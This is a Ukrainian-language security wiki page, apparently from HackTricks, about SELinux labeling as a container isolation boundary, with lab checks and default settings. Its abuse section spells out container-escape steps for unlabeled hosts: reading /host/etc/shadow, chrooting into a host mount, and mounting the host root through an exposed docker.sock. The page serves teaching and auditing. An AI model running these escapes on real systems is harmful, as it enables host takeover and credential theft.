# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

SELinux — це система **примусового контролю доступу на основі міток**. Кожен відповідний процес і об'єкт може мати контекст безпеки, а політика визначає, які домени можуть взаємодіяти з якими типами і яким способом. У контейнеризованих середовищах це зазвичай означає, що runtime запускає процес контейнера в обмеженому container domain і позначає вміст контейнера відповідними типами. Якщо політика працює правильно, процес зможе читати й записувати те, до чого його мітка має доступ, і водночас йому буде відмовлено в доступі до іншого вмісту хоста, навіть якщо цей вміст стає видимим через монтування.

Це один із найпотужніших захистів на боці хоста, доступних у поширених розгортаннях Linux-контейнерів. Він особливо важливий у Fedora, RHEL, CentOS Stream, OpenShift та інших екосистемах, орієнтованих на SELinux. У таких середовищах рецензент, який ігнорує SELinux, часто неправильно зрозуміє, чому очевидний шлях до компрометації хоста насправді заблоковано.

## AppArmor Vs SELinux

Найпростіша загальна різниця полягає в тому, що AppArmor базується на шляхах, тоді як SELinux — **на основі міток**. Це має великі наслідки для безпеки контейнерів. Політика, що базується на шляхах, може поводитися по-іншому, якщо той самий вміст хоста стане видимим під несподіваним шляхом монтування. Політика на основі міток натомість запитує, яка мітка об'єкта і що домен процесу може з нею робити. Це не робить SELinux простим, але робить його стійким до класу припущень, заснованих на трюках із шляхами, які захисники іноді випадково роблять у системах на основі AppArmor.

Оскільки модель орієнтована на мітки, обробка томів контейнера та рішення щодо перетегування мають критичне значення для безпеки. Якщо runtime або оператор занадто широко змінюють мітки, щоб «змусити монтування працювати», межа політики, яка мала містити робоче навантаження, може стати набагато слабшою, ніж було задумано.

## Лаб

Щоб перевірити, чи активний SELinux на хості:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Щоб переглянути існуючі мітки на хості:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Щоб порівняти звичайний запуск з тим, де маркування вимкнено:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
На хості з увімкненим SELinux це дуже практична демонстрація, оскільки показує різницю між робочим навантаженням, що працює під очікуваним доменом контейнера, і тим, якого позбавили цього шару примусових обмежень.

## Використання під час виконання

Podman особливо добре інтегрований із SELinux на системах, де SELinux є частиною стандартної конфігурації платформи. Rootless Podman плюс SELinux — одна з найміцніших стандартних базових конфігурацій контейнерів, оскільки процес уже є непривілейованим на боці хоста і все ще обмежений політикою MAC. Docker також може використовувати SELinux там, де це підтримується, хоча адміністратори іноді вимикають його, щоб обійти проблеми з маркуванням томів. CRI-O і OpenShift сильно покладаються на SELinux як частину своєї історії ізольованості контейнерів. Kubernetes також може надавати налаштування, пов’язані із SELinux, але їхня користь очевидно залежить від того, чи підтримує та чи примушує SELinux сам ОС вузла.

Повторювана ідея в тому, що SELinux — не опціональна прикраса. У екосистемах, побудованих навколо нього, він є частиною очікуваної межі безпеки.

## Неправильні налаштування

Класична помилка — `label=disable`. Операційно це часто відбувається через те, що монтування тома було відхилене, і найшвидшим тимчасовим рішенням було прибрати SELinux із рівня задач замість виправлення моделі маркування. Інша поширена помилка — некоректне повторне маркування вмісту хоста. Широкі операції з перемаркування можуть змусити додаток працювати, але вони також можуть розширити те, до чого контейнер дозволено звертатися, значно далі за початкові наміри.

Також важливо не плутати **installed** SELinux з **effective** SELinux. Хост може підтримувати SELinux і при цьому перебувати в permisive режимі, або runtime може не запускати робоче навантаження під очікуваним доменом. У таких випадках захист значно слабший, ніж може натякати документація.

## Зловживання

Коли SELinux відсутній, у permissive режимі або широко відключений для робочого навантаження, шляхи, змонтовані з хоста, стають набагато легшими для зловживань. Той самий bind mount, який зазвичай був би обмежений мітками, може стати прямим шляхом до даних хоста або до змін на хості. Це особливо актуально в поєднанні з writable volume mounts, container runtime directories або оперативними скороченнями, які для зручності відкривали чутливі шляхи хоста.

SELinux часто пояснює, чому універсальний breakout writeup відразу працює на одному хості, але постійно зазнає невдачі на іншому, хоча прапорці runtime виглядають схожими. Часто відсутній інгредієнт — це не простір імен або capability, а межа міток, яка залишалася незруйнованою.

Найшвидша практична перевірка — порівняти активний контекст і потім перевірити змонтовані шляхи хоста або runtime directories, які зазвичай були б обмежені мітками:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Якщо присутній host bind mount і маркування SELinux було вимкнено або послаблено, часто спочатку відбувається розкриття інформації:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Якщо mount є writable, а container фактично є host-root з точки зору kernel, наступним кроком буде протестувати контрольовану модифікацію host замість здогадок:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
На хостах із підтримкою SELinux, втрата міток у директоріях стану runtime також може відкрити прямі шляхи privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ці команди не замінюють повний escape chain, але дуже швидко показують, чи саме SELinux перешкоджав доступу до даних хоста або зміні файлів на боці хоста.

### Повний приклад: SELinux вимкнено + доступне для запису монтування хоста

Якщо маркування SELinux вимкнено і файлову систему хоста змонтовано для запису в `/host`, повний host escape перетворюється на звичайний випадок зловживання bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо `chroot` вдасться, процес контейнера тепер працює з файлової системи хоста:
```bash
id
hostname
cat /etc/passwd | tail
```
### Повний приклад: SELinux Disabled + Runtime Directory

Якщо workload може дістатися до runtime socket після того, як labels вимкнені, escape можна делегувати runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Відповідне спостереження полягає в тому, що SELinux часто був контролем, який саме заважав доступу до такого роду host-path або runtime-state.

## Checks

Мета перевірок SELinux — підтвердити, що SELinux увімкнено, визначити поточний контекст безпеки та з'ясувати, чи файли або шляхи, що вас цікавлять, фактично обмежені мітками.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Цікаве тут:

- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
- Якщо поточний контекст процесу виглядає несподіваним або занадто широким, робоче навантаження може не запускатися під передбаченою політикою контейнера.
- Якщо файли, змонтовані з хоста, або runtime‑каталоги мають мітки, до яких процес має надто вільний доступ, bind mounts стають набагато небезпечнішими.

Під час перевірки контейнера на платформі з підтримкою SELinux не розглядайте маркування як другорядну деталь. У багатьох випадках саме воно є однією з основних причин, чому хост ще не скомпрометовано.

## Налаштування за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Залежить від хоста | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, широке переназначення міток для bind mounts, `--privileged` |
| Podman | Зазвичай увімкнено на хостах із SELinux | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Зазвичай не призначається автоматично на рівні Pod | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | слабкі або широкі `seLinuxOptions`, запуск на permissive/disabled вузлах, політики платформи, що вимикають маркування |
| CRI-O / OpenShift style deployments | На них зазвичай сильно покладаються | SELinux is often a core part of the node isolation model in these environments | кастомні політики, що надто розширюють доступ, вимикання маркування для сумісності |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
{{#include ../../../../banners/hacktricks-training.md}}
